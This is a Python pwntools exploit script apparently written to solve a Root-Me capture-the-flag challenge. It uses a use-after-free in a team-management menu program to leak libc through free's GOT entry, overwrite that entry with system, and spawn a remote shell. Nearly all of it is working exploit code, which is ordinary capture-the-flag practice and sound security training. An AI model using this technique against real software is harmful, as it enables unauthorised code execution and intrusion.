from pwn import *
menu_end = "quit\n\n: "
#context.log_level = 'debug'
def add(p, team, desc, alias=""):
    p.sendline("add " + alias)
    print(p.recvuntil("Team: "))
    p.sendline(team)
    print(p.recvuntil("Desc: "))
    p.sendline(desc)
def show(p, index, alias=""):
    p.sendline("show " + alias)
    if (alias == ""):
        print(p.recvuntil("Index: " ))
        p.sendline(index)
def delete(p, index, alias=""):
    p.sendline("del " + alias)
    if (alias == ""):
        print(p.recvuntil("Index: " ))
        p.sendline(index)
def edit(p, index,team, desc, points, alias=""):
    p.sendline("edit " + alias)
    if (alias == ""):
        print(p.recvuntil("Index: " ))
        p.sendline(index)
        print(p.recvuntil("Team: Team: "))
        p.sendline(team)
        print(p.recvuntil("Desc: "))
        p.sendline(desc)
        print(p.recvuntil("Points: "))
        p.sendline(points)
    else:
        print(p.recvuntil("Team: " ))
        p.sendline(team)
        print(p.recvuntil("Desc: " ))
        p.sendline(desc)
        print(p.recvuntil("Points: " ))
        p.sendline(points)
        
def export(p):
    p.sendline("export json")
def main():
    # p = process("./ch47")
    p = remote("challenge04.root-me.org", 61047)
    print(p.recvuntil(menu_end))
#1. add 3 teams
    add(p,"MS509", "AAAAAAAAAAAAAAAA", "xx")
    print(p.recvuntil(menu_end))
    add(p,"MS508", "B", "yy")
    print(p.recvuntil(menu_end))
    #notice, the description is /bin/sh which will be free'd later since we modify element of free_got into system 
    add(p,"MS507", "/bin/sh", "zz")
    print(p.recvuntil(menu_end))
#    print "[+] Waiting for debugging.."
#    raw_input()
#2. del team 0 to get a dangling pointer which will be referenced by alias later
    delete(p, "0")
    print(p.recvuntil(menu_end))
#3. edit team 1, update the description pointer of malloc in the place of team 0 
    got_free = int("0x23014", 16) #no PIE, it's fixed
    payload = b"C"*56 + p32(got_free)  #must be 60bytes to be allocated in the free'd team 0, there is a '\00' in the end
    edit(p, "1", "MS508", payload, "50") 
    print(p.recvuntil(menu_end))
#4. show the deleted team 0 by alias to leak the free address, Print After Free
    show(p,"unused", "xx")
    print(p.recvuntil("Desc:  ")) #Notice , there are two spaces after Desc:
    addr_free_str = p.recv(4)
  # log.debug("free address is %s" % addr_free_str.encode("hex"))
    addr_free = u32(addr_free_str)
    log.debug("free address is %s" % hex(addr_free))
    print(p.recvuntil(menu_end))
    
#5. using the leaked address to get system address
    # libc = ELF("./libc.remote")
    libc = ELF("./ld-2.23.so")
    # libc = ELF("./libc.so.6")
    addr_system = addr_free - (libc.symbols['free'] - libc.symbols['system'])
    addr_fgets = addr_free - (libc.symbols['free'] - libc.symbols['fgets'])
    addr_memcpy = addr_free - (libc.symbols['free'] - libc.symbols['memcpy'])
    log.debug("system address is %s" % hex(addr_system))
    log.debug("fgets address is %s" % hex(addr_fgets))
#6. edit team0 to make got_free point to system addr, NOTE: let other funciton used later alone
    edit(p, "not_used", "MS509", p32(addr_system)+p32(addr_fgets)+p32(addr_memcpy),"100", "xx")
    print(p.recvuntil(menu_end))
    
#7. del team2 to trigger free which actually is system("/bin/sh") 
    export(p)
    delete(p, "2")
    p.interactive()
if __name__ == "__main__":
    main()